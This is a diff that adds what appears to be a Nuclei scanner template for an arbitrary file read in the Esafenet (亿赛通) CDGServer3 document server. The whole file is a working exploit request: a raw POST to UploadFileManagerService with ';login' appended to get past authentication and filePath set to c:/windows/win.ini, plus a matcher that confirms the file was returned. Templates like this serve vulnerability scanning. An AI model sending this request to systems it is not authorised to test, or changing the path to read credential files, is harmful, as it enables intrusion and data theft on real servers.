@@ -1,0 +1,26 @@
+id: readFile
+
+info:
+  name: 亿赛通UploadFileManagerService文件读取
+  author: sm
+  severity: medium
+  tags: 亿赛通
+
+requests:
+  - raw:
+      - |              
+        POST /CDGServer3/document/UploadFileManagerService;login HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept-Language: zh-CN
+        Accept-Encoding: gzip, deflate
+        X-Requested-With: XMLHttpRequest
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+
+        command=ViewUploadFile&filePath=c:/windows/win.ini&fileName1=hello
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body+all_headers,"[fonts]","attachment;filename")
